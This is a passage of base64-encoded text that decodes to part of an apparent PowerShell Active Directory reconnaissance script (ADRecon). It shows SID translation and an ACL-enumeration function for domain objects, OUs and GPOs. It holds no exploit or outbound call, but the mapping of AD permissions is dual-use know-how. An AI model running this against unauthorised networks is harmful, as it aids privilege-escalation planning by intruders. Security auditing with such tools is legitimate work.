XRlLVdhcm5pbmcgIltDb252ZXJ0RnJvbS1TSURdIEVycm9yIHdoaWxlIGVudW1lcmF0aW5nIE9iamVjdCB1c2luZyBTSUQiCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltFWENFUFRJT05dICQoJF8uRXhjZXB0aW9uLk1lc3NhZ2UpIgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBJZiAoJEFET2JqZWN0KQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJFVzZXJEb21haW4gPSBHZXQtRE50b0ZRRE4gLUFET2JqZWN0RE4gJEFET2JqZWN0LkRpc3Rpbmd1aXNoZWROYW1lCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRBRFNPdXRwdXQgPSAkVXNlckRvbWFpbiArICJcIiArICRBRE9iamVjdC5zQU1BY2NvdW50TmFtZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBSZW1vdmUtVmFyaWFibGUgVXNlckRvbWFpbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBJZiAoJFByb3RvY29sIC1lcSAnTERBUCcpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgSWYgKCRDcmVkZW50aWFsIC1uZSBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF06OkVtcHR5KQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJEFET2JqZWN0ID0gTmV3LU9iamVjdCBTeXN0ZW0uRGlyZWN0b3J5U2VydmljZXMuRGlyZWN0b3J5RW50cnkoIkxEQVA6Ly8kRG9tYWluRlFETi88U0lEPSRUYXJnZXRTaWQ+IiwoJENyZWRlbnRpYWwuR2V0TmV0d29ya0NyZWRlbnRpYWwoKSkuVXNlck5hbWUsKCRDcmVkZW50aWFsLkdldE5ldHdvcmtDcmVkZW50aWFsKCkpLlBhc3N3b3JkKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBFbHNlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkQURPYmplY3QgPSBOZXctT2JqZWN0IFN5c3RlbS5EaXJlY3RvcnlTZXJ2aWNlcy5EaXJlY3RvcnlFbnRyeSgiTERBUDovLyREb21haW5GUUROLzxTSUQ9JFRhcmdldFNpZD4iKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBJZiAoJEFET2JqZWN0KQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgSWYgKC1Ob3QgKFtzdHJpbmddOjpJc051bGxPckVtcHR5KCRBRE9iamVjdC5Qcm9wZXJ0aWVzLnNhbWFjY291bnRuYW1lKSkgKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkVXNlckRvbWFpbiA9IEdldC1ETnRvRlFETiAtQURPYmplY3RETiAkKFtzdHJpbmddICgkQURPYmplY3QuUHJvcGVydGllcy5kaXN0aW5ndWlzaGVkbmFtZSkpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkQURTT3V0cHV0ID0gJFVzZXJEb21haW4gKyAiXCIgKyAkKFtzdHJpbmddICgkQURPYmplY3QuUHJvcGVydGllcy5zYW1hY2NvdW50bmFtZSkpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBSZW1vdmUtVmFyaWFibGUgVXNlckRvbWFpbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIElmICggKC1Ob3QgJEFEU091dHB1dCkgLW9yIChbc3RyaW5nXTo6SXNOdWxsT3JFbXB0eSgkQURTT3V0cHV0KSkgKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRBRFNPdXRwdXRUeXBlID0gJEFEU19OQU1FX1RZUEVfTlQ0CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJEluaXQgPSAkdHJ1ZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRUcmFuc2xhdGUgPSBOZXctT2JqZWN0IC1Db21PYmplY3QgTmFtZVRyYW5zbGF0ZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIElmICgkQ3JlZGVudGlhbCAtbmUgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdOjpFbXB0eSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRBRFNJbml0VHlwZSA9ICRBRFNfTkFNRV9JTklUVFlQRV9ET01BSU4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgVHJ5CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFtTeXN0ZW0uX19Db21PYmplY3RdLkludm9rZU1lbWJlcijigJxJbml0RXjigJ0s4oCdSW52b2tlTWV0aG9k4oCdLCRudWxsLCRUcmFuc2xhdGUsJChAKCRBRFNJbml0VHlwZSwkRG9tYWluRlFETiwoJENyZWRlbnRpYWwuR2V0TmV0d29ya0NyZWRlbnRpYWwoKSkuVXNlck5hbWUsJERvbWFpbkZRRE4sKCRDcmVkZW50aWFsLkdldE5ldHdvcmtDcmVkZW50aWFsKCkpLlBhc3N3b3JkKSkpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgQ2F0Y2gKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJEluaXQgPSAkZmFsc2UKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICNXcml0ZS1WZXJib3NlICJbQ29udmVydEZyb20tU0lEXSBFcnJvciBpbml0aWFsaXppbmcgdHJhbnNsYXRpb24gZm9yICQoJFRhcmdldFNpZCkgdXNpbmcgYWx0ZXJuYXRlIGNyZWRlbnRpYWxzIgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgI1dyaXRlLVZlcmJvc2UgIltFWENFUFRJT05dICQoJF8uRXhjZXB0aW9uLk1lc3NhZ2UpIgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEVsc2UKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRBRFNJbml0VHlwZSA9ICRBRFNfTkFNRV9JTklUVFlQRV9HQwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBUcnkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgW1N5c3RlbS5fX0NvbU9iamVjdF0uSW52b2tlTWVtYmVyKOKAnEluaXTigJ0s4oCdSW52b2tlTWV0aG9k4oCdLCRudWxsLCRUcmFuc2xhdGUsKCRBRFNJbml0VHlwZSwkbnVsbCkpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgQ2F0Y2gKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJEluaXQgPSAkZmFsc2UKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICNXcml0ZS1WZXJib3NlICJbQ29udmVydEZyb20tU0lEXSBFcnJvciBpbml0aWFsaXppbmcgdHJhbnNsYXRpb24gZm9yICQoJFRhcmdldFNpZCkiCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAjV3JpdGUtVmVyYm9zZSAiW0VYQ0VQVElPTl0gJCgkXy5FeGNlcHRpb24uTWVzc2FnZSkiCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgSWYgKCRJbml0KQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgW1N5c3RlbS5fX0NvbU9iamVjdF0uSW52b2tlTWVtYmVyKOKAnENoYXNlUmVmZXJyYWzigJ0s4oCdU2V0UHJvcGVydHnigJ0sJG51bGwsJFRyYW5zbGF0ZSwkQURTX0NIQVNFX1JFRkVSUkFMU19BTFdBWVMpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFRyeQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBbU3lzdGVtLl9fQ29tT2JqZWN0XS5JbnZva2VNZW1iZXIo4oCcU2V04oCdLOKAnUludm9rZU1ldGhvZOKAnSwkbnVsbCwkVHJhbnNsYXRlLCgkQURTX05BTUVfVFlQRV9VTktOT1dOLCAkVGFyZ2V0U0lEKSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRBRFNPdXRwdXQgPSBbU3lzdGVtLl9fQ29tT2JqZWN0XS5JbnZva2VNZW1iZXIo4oCcR2V04oCdLOKAnUludm9rZU1ldGhvZOKAnSwkbnVsbCwkVHJhbnNsYXRlLCRBRFNPdXRwdXRUeXBlKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIENhdGNoCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICNXcml0ZS1WZXJib3NlICJbQ29udmVydEZyb20tU0lEXSBFcnJvciB0cmFuc2xhdGluZyAkKCRUYXJnZXRTaWQpIgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgI1dyaXRlLVZlcmJvc2UgIltFWENFUFRJT05dICQoJF8uRXhjZXB0aW9uLk1lc3NhZ2UpIgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgIElmICgtTm90IChbc3RyaW5nXTo6SXNOdWxsT3JFbXB0eSgkQURTT3V0cHV0KSkgKQogICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBSZXR1cm4gJEFEU091dHB1dAogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgIEVsc2UKICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgUmV0dXJuICRUYXJnZXRTaWQKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgICAgICBDYXRjaAogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAjV3JpdGUtT3V0cHV0ICJbQ29udmVydEZyb20tU0lEXSBFcnJvciBjb252ZXJ0aW5nIFNJRCAkKCRUYXJnZXRTaWQpIgogICAgICAgICAgICAgICAgI1dyaXRlLVZlcmJvc2UgIltFWENFUFRJT05dICQoJF8uRXhjZXB0aW9uLk1lc3NhZ2UpIgogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIEVsc2UKICAgICAgICB7CiAgICAgICAgICAgIFJldHVybiAkVGFyZ2V0U2lkCiAgICAgICAgfQogICAgfQp9CgojIGJhc2VkIG9uIGh0dHBzOi8vZ2FsbGVyeS50ZWNobmV0Lm1pY3Jvc29mdC5jb20vQWN0aXZlLURpcmVjdG9yeS1PVS0xZDA5Zjk4OQpGdW5jdGlvbiBHZXQtQURSQUNMCnsKPCMKLlNZTk9QU0lTCiAgICBSZXR1cm5zIGFsbCBBQ0xzIGZvciB0aGUgRG9tYWluLCBPVXMsIFJvb3QgQ29udGFpbmVycywgR1BPLCBVc2VyLCBDb21wdXRlciBhbmQgR3JvdXAgb2JqZWN0cyBpbiB0aGUgY3VycmVudCAob3Igc3BlY2lmaWVkKSBkb21haW4uCgouREVTQ1JJUFRJT04KICAgIFJldHVybnMgYWxsIEFDTHMgZm9yIHRoZSBEb21haW4sIE9VcywgUm9vdCBDb250YWluZXJzLCBHUE8sIFVzZXIsIENvbXB1dGVyIGFuZCBHcm91cCBvYmplY3RzIGluIHRoZSBjdXJyZW50IChvciBzcGVjaWZpZWQpIGRvbWFpbi4KCi5QQVJBTUVURVIgUHJvdG9jb2wKICAgIFtzdHJpbmddCiAgICBXaGljaCBwcm90b2NvbCB0byB1c2U7IEFEV1MgKGRlZmF1bHQpIG9yIExEQVAuCgouUEFSQU1FVEVSIG9iakRvbWFpbgogICAgW0RpcmVjdG9yeVNlcnZpY2VzLkRpcmVjdG9yeUVudHJ5XQogICAgRG9tYWluIERpcmVjdG9yeSBFbnRyeSBvYmplY3QuCgouUEFSQU1FVEVSIERvbWFpbkNvbnRyb2xsZXIKICAgIFtzdHJpbmddCiAgICBJUCBBZGRyZXNzIG9mIHRoZSBEb21haW4gQ29udHJvbGxlci4KCi5QQVJBTUVURVIgQ3JlZGVudGlhbAogICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdCiAgICBDcmVkZW50aWFscy4KCi5QQVJBTUVURVIgUmVzb2x2ZVNJRHMKICAgIFtib29sXQogICAgV2hldGhlciB0byByZXNvbHZlIFNJRHMgaW4gdGhlIEFDTHMgbW9kdWxlLiAoRGVmYXVsdCBGYWxzZSkKCi5QQVJBTUVURVIgUGFnZVNpemUKICAgIFtpbnRdCiAgICBUaGUgUGFnZVNpemUgdG8gc2V0IGZvciB0aGUgTERBUCBzZWFyY2hlciBvYmplY3QuIERlZmF1bHQgMjAwLgoKLlBBUkFNRVRFUiBUaHJlYWRzCiAgICBbaW50XQogICAgVGhlIG51bWJlciBvZiB0aHJlYWRzIHRvIHVzZSBkdXJpbmcgcHJvY2Vzc2luZyBvZiBvYmplY3RzLiBEZWZhdWx0IDEwLgoKLk9VVFBVVFMKICAgIFBTT2JqZWN0LgoKLkxJTksKICAgIGh0dHBzOi8vZ2FsbGVyeS50ZWNobmV0Lm1pY3Jvc29mdC5jb20vQWN0aXZlLURpcmVjdG9yeS1PVS0xZDA5Zjk4OQojPgogICAgcGFyYW0oCiAgICAgICAgW1BhcmFtZXRlcihNYW5kYXRvcnkgPSAkdHJ1ZSldCiAgICAgICAgW3N0cmluZ10gJFByb3RvY29sLAoKICAgICAgICBbUGFyYW1ldGVyKE1hbmRhdG9yeSA9ICRmYWxzZSldCiAgICAgICAgW0RpcmVjdG9yeVNlcnZpY2VzLkRpcmVjdG9yeUVudHJ5XSAkb2JqRG9tYWluLAoKICAgICAgICBbUGFyYW1ldGVyKE1hbmRhdG9yeSA9ICRmYWxzZSldCiAgICAgICAgW3N0cmluZ10gJERvbWFpbkNvbnRyb2xsZXIsCgogICAgICAgIFtQYXJhbWV0ZXIoTWFuZGF0b3J5ID0gJGZhbHNlKV0KICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF0gJENyZWRlbnRpYWwgPSBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF06OkVtcHR5LAoKICAgICAgICBbUGFyYW1ldGVyKE1hbmRhdG9yeSA9ICRmYWxzZSldCiAgICAgICAgW2Jvb2xdICRSZXNvbHZlU0lEID0gJGZhbHNlLAoKICAgICAgICBbUGFyYW1ldGVyKE1hbmRhdG9yeSA9ICR0cnVlKV0KICAgICAgICBbaW50XSAkUGFnZVNpemUsCgogICAgICAgIFtQYXJhbWV0ZXIoTWFuZGF0b3J5ID0gJGZhbHNlKV0KICAgICAgICBbaW50XSAkVGhyZWFkcyA9IDEwCiAgICApCgogICAgSWYgKCRQcm90b2NvbCAtZXEgJ0FEV1MnKQogICAgewogICAgICAgIElmICgkQ3JlZGVudGlhbCAtZXEgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdOjpFbXB0eSkKICAgICAgICB7CiAgICAgICAgICAgIElmIChUZXN0LVBhdGggQUQ6KQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBTZXQtTG9jYXRpb24gQUQ6CiAgICAgICAgICAgIH0KICAgICAgICAgICAgRWxzZQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBXcml0ZS1XYXJuaW5nICJEZWZhdWx0IEFEIGRyaXZlIG5vdCBmb3VuZCAuLi4gU2tpcHBpbmcgQUNMIGVudW1lcmF0aW9uIgogICAgICAgICAgICAgICAgUmV0dXJuICRudWxsCiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgJEdVSURzID0gQHsnMDAwMDAwMDAtMDAwMC0wMDAwLTAwMDAtMDAwMDAwMDAwMDAwJyA9ICdBbGwnfQogICAgICAgIFRyeQogICAgICAgIHsKICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiWypdIEVudW1lcmF0aW5nIHNjaGVtYUlEcyIKICAgICAgICAgICAgJHNjaGVtYUlEcyA9IEdldC1BRE9iamVjdCAtU2VhcmNoQmFzZSAoR2V0LUFEUm9vdERTRSkuc2NoZW1hTmFtaW5nQ29udGV4dCAtTERBUEZpbHRlciAnKHNjaGVtYUlER1VJRD0qKScgLVByb3BlcnRpZXMgbmFtZSwgc2NoZW1hSURHVUlECiAgICAgICAgfQogICAgICAgIENhdGNoCiAgICAgICAgewogICAgICAgICAgICBXcml0ZS1XYXJuaW5nICJbR2V0LUFEUkFDTF0gRXJyb3Igd2hpbGUgZW51bWVyYXRpbmcgc2NoZW1hSURzIgogICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbRVhDRVBUSU9OXSAkKCRfLkV4Y2VwdGlvbi5NZXNzYWdlKSIKICAgICAgICB9CgogICAgICAgIElmICgkc2NoZW1hSURzKQogICAgICAgIHsKICAgICAgICAgICAgJHNjaGVtYUlEcyB8IFdoZXJlLU9iamVjdCB7JF99IHwgRm9yRWFjaC1PYmplY3QgewogICAgICAgICAgICAgICAgIyBjb252ZXJ0IHRoZSBHVUlECiAgICAgICAgICAgICAgICAkR1VJRHNbKE5ldy1PYmplY3QgR3VpZCAoLCRfLnNjaGVtYUlER1VJRCkpLkd1aWRdID0gJF8ubmFtZQogICAgICAgICAgICB9CiAgICAgICAgICAgIFJlbW92ZS1WYXJpYWJsZSBzY2hlbWFJRHMKICAgICAgICB9CgogICAgICAgIFRyeQogICAgICAgIHsKICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiWypdIEVudW1lcmF0aW5nIEFjdGl2ZSBEaXJlY3RvcnkgUmlnaHRzIgogICAgICAgICAgICAkc2NoZW1hSURzID0gR2V0LUFET2JqZWN0IC1TZWFyY2hCYXNlICJDTj1FeHRlbmRlZC1SaWdodHMsJCgoR2V0LUFEUm9vdERTRSkuY29uZmlndXJhdGlvbk5hbWluZ0NvbnRleHQpIiAtTERBUEZpbHRlciAnKG9iamVjdENsYXNzPWNvbnRyb2xBY2Nlc3NSaWdodCknIC1Qcm9wZXJ0aWVzIG5hbWUsIHJpZ2h0c0dVSUQKICAgICAgICB9CiAgICAgICAgQ2F0Y2gKICAgICAgICB7CiAgICAgICAgICAgIFdyaXRlLVdhcm5pbmcgIltHZXQtQURSQUNMXSBFcnJvciB3aGlsZSBlbnVtZXJhdGluZyBBY3RpdmUgRGlyZWN0b3J5IFJpZ2h0cyIKICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0VYQ0VQVElPTl0gJCgkXy5FeGNlcHRpb24uTWVzc2FnZSkiCiAgICAgICAgfQoKICAgICAgICBJZiAoJHNjaGVtYUlEcykKICAgICAgICB7CiAgICAgICAgICAgICRzY2hlbWFJRHMgfCBXaGVyZS1PYmplY3QgeyRffSB8IEZvckVhY2gtT2JqZWN0IHsKICAgICAgICAgICAgICAgICMgY29udmVydCB0aGUgR1VJRAogICAgICAgICAgICAgICAgJEdVSURzWyhOZXctT2JqZWN0IEd1aWQgKCwkXy5yaWdodHNHVUlEKSkuR3VpZF0gPSAkXy5uYW1lCiAgICAgICAgICAgIH0KICAgICAgICAgICAgUmVtb3ZlLVZhcmlhYmxlIHNjaGVtYUlEcwogICAgICAgIH0KCiAgICAgICAgIyBHZXQgdGhlIERpc3Rpbmd1aXNoZWROYW1lcyBvZiBEb21haW4sIE9VcywgUm9vdCBDb250YWluZXJzIGFuZCBHcm91cFBvbGljeSBvYmplY3RzLgogICAgICAgICRPYmpzID0gQCgpCiAgICAgICAgVHJ5CiAgICAgICAgewogICAgICAgICAgICAkQUREb21haW4gPSBHZXQtQUREb21haW4KICAgICAgICB9CiAgICAgICAgQ2F0Y2gKICAgICAgICB7CiAgICAgICAgICAgIFdyaXRlLVdhcm5pbmcgIltHZXQtQURSQUNMXSBFcnJvciBnZXR0aW5nIERvbWFpbiBDb250ZXh0IgogICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbRVhDRVBUSU9OXSAkKCRfLkV4Y2VwdGlvbi5NZXNzYWdlKSIKICAgICAgICB9CgogICAgICAgIFRyeQogICAgICAgIHsKICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiWypdIEVudW1lcmF0aW5nIERvbWFpbiwgT1UsIEdQTywgVXNlciwgQ29tcHV0ZXIgYW5kIEdyb3VwIE9iamVjdHMiCiAgICAgICAgICAgICRPYmpzICs9IEdldC1BRE9iamVjdCAtTERBUEZpbHRlciAnKHwob2JqZWN0Q2xhc3M9ZG9tYWluKShvYmplY3RDYXRlZ29yeT1vcmdhbml6YXRpb25hbHVuaXQpKG9iamVjdENhdGVnb3J5PWdyb3VwUG9saWN5Q29udGFpbmVyKShzYW1BY2NvdW50VHlwZT04MDUzMDYzNjgpKHNhbUFjY291bnRUeXBlPTgwNTMwNjM2OSkoc2FtYWNjb3VudHR5cGU9MjY4NDM1NDU2KShzYW1hY2NvdW50dHlwZT0yNjg0MzU0NTcpKHNhbWFjY291bnR0eXBlPTUzNjg3MDkxMikoc2FtYWNjb3VudHR5cGU9NTM2ODcwOTEzKSknIC1Qcm9wZXJ0aWVzIERpc3BsYXlOYW1lLCBEaXN0aW5ndWlzaGVkTmFtZSwgTmFtZSwgbnRzZWN1cml0eWRlc2NyaXB0b3IsIE9iamVjdENsYXNzLCBvYmplY3RzaWQKICAgICAgICB9CiAgICAgICAgQ2F0Y2gKICAgICAgICB7CiAgICAgICAgICAgIFdyaXRlLVdhcm5pbmcgIltHZXQtQURSQUNMXSBFcnJvciB3aGlsZSBlbnVtZXJhdGluZyBEb21haW4sIE9VLCBHUE8sIFVzZXIsIENvbXB1dGVyIGFuZCBHcm91cCBPYmplY3RzIgogICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbRVhDRVBUSU9OXSAkKCRfLkV4Y2VwdGlvbi5NZXNzYWdlKSIKICAgICAgICB9CgogICAgICAgIElmICgkQUREb21haW4pCiAgICAgICAgewogICAgICAgICAgICBUcnkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiWypdIEVudW1lcmF0aW5nIFJvb3QgQ29udGFpbmVyIE9iamVjdHMiCiAgICAgICAgICAgICAgICAkT2JqcyArPSBHZXQtQURPYmplY3QgLVNlYXJjaEJhc2UgJCgkQUREb21haW4uRGlzdGluZ3Vpc2hlZE5hbWUpIC1TZWFyY2hTY29wZSBPbmVMZXZlbCAtTERBUEZpbHRlciAnKG9iamVjdENsYXNzPWNvbnRhaW5lciknIC1Qcm9wZXJ0aWVzIERpc3Rpbmd1aXNoZWROYW1lLCBOYW1lLCBudHNlY3VyaXR5ZGVzY3JpcHRvciwgT2JqZWN0Q2xhc3MKICAgICAgICAgICAgfQogICAgICAgICAgICBDYXRjaAogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBXcml0ZS1XYXJuaW5nICJbR2V0LUFEUkFDTF0gRXJyb3Igd2hpbGUgZW51bWVyYXRpbmcgUm9vdCBDb250YWluZXIgT2JqZWN0cyIKICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltFWENFUFRJT05dICQoJF8uRXhjZXB0aW9uLk1lc3NhZ2UpIgogICAgICAgICAgICB9CiAgICAgICAgfQoKICAgICAgICBJZiAoJE9ianMpCiAgICAgICAgewogICAgICAgICAgICAkQUNMT2JqID0gQCgpCiAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIlsqXSBUb3RhbCBPYmplY3RzOiAkKFtBRFJlY29uLkFEV1NDbGFzc106Ok9iamVjdENvdW50KCRPYmpzKSkiCiAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIlstXSBEQUNMcyIKICAgICAgICAgICAgJERBQ0xPYmogPSBbQURSZWNvbi5BRFdTQ2xhc3NdOjpEQUNMUGFyc2VyKCRPYmpzLCAkR1VJRHMsICRUaHJlYWRzKQogICAgICAgICAgICAjV3JpdGUtVmVyYm9zZSAiWy1dIFNBQ0xzIC0gTWF5IG5lZWQgYSBQcml2aWxlZ2VkIEFjY291bnQiCiAgICAgICAgICAgIFdyaXRlLVdhcm5pbmcgIlsqXSBTQUNMcyAtIEN1cnJlbnRseSwgdGhlIG1vZHVsZSBpcyBvbmx5IHN1cHBvcnRlZCB3aXRoIExEQVAuIgogICAgICAgICAgICAjJFNBQ0xPYmogPSBbQURSZWNvbi5BRFdTQ2xhc3NdOjpTQUNMUGFyc2VyKCRPYmpzLCAkR1VJRHMsICRUaHJlYWRzKQogICAgICAgICAgICBSZW1vdmUtVmFyaWFibGUgT2JqcwogICAgICAgICAgICBSZW1vdmUtVmFyaWFibGUgR1VJRHMKICAgICAgICB9CiAgICB9CgogICAgSWYgKCRQcm90b2NvbCAtZXEgJ0xEQVAnKQogICAgewogICAgICAgICRHVUlEcyA9IEB7JzAwMDAwMDAwLTAwMDAtMDAwMC0wMDAwLTAwMDAwMDAwMDAwMCcgPSAnQWxsJ30KCiAgICAgICAgSWYgKCRDcmVkZW50aWFsIC1uZSBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF06OkVtcHR5KQogICAgICAgIHsKICAgICAgICAgICAgJERvbWFpbkZRRE4gPSBHZXQtRE50b0ZRRE4oJG9iakRvbWFpbi5kaXN0aW5ndWlzaGVkTmFtZSkKICAgICAgICAgICAgJERvbWFpbkNvbnRleHQgPSBOZXctT2JqZWN0IFN5c3RlbS5EaXJlY3RvcnlTZXJ2aWNlcy5BY3RpdmVEaXJlY3RvcnkuRGlyZWN0b3J5Q29udGV4dCgiRG9tYWluIiwkKCREb21haW5GUUROKSwkKCRDcmVkZW50aWFsLlVzZXJOYW1lKSwkKCRDcmVkZW50aWFsLkdldE5ldHdvcmtDcmVkZW50aWFsKCkucGFzc3dvcmQpKQogICAgICAgICAgICBUcnkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgJEFERG9tYWluID0gW1N5c3RlbS5EaXJlY3RvcnlTZXJ2aWNlcy5BY3RpdmVEaXJlY3RvcnkuRG9tYWluXTo6R2V0RG9tYWluKCREb21haW5Db250ZXh0KQogICAgICAgICAgICB9CiAgICAgICAgICAgIENhdGNoCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIFdyaXRlLVdhcm5pbmcgIltHZXQtQURSQUNMXSBFcnJvciBnZXR0aW5nIERvbWFpbiBDb250ZXh0IgogICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0VYQ0VQVElPTl0gJCgkXy5FeGNlcHRpb24uTWVzc2FnZSkiCiAgICAgICAgICAgIH0KCiAgICAgICAgICAgIFRyeQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAkRm9yZXN0Q29udGV4dCA9IE5ldy1PYmplY3QgU3lzdGVtLkRpcmVjdG9yeVNlcnZpY2VzLkFjdGl2ZURpcmVjdG9yeS5EaXJlY3RvcnlDb250ZXh0KCJGb3Jlc3QiLCQoJEFERG9tYWluLkZvcmVzdCksJCgkQ3JlZGVudGlhbC5Vc2VyTmFtZSksJCgkQ3JlZGVudGlhbC5HZXROZXR3b3JrQ3JlZGVudGlhbCgpLnBhc3N3b3Jk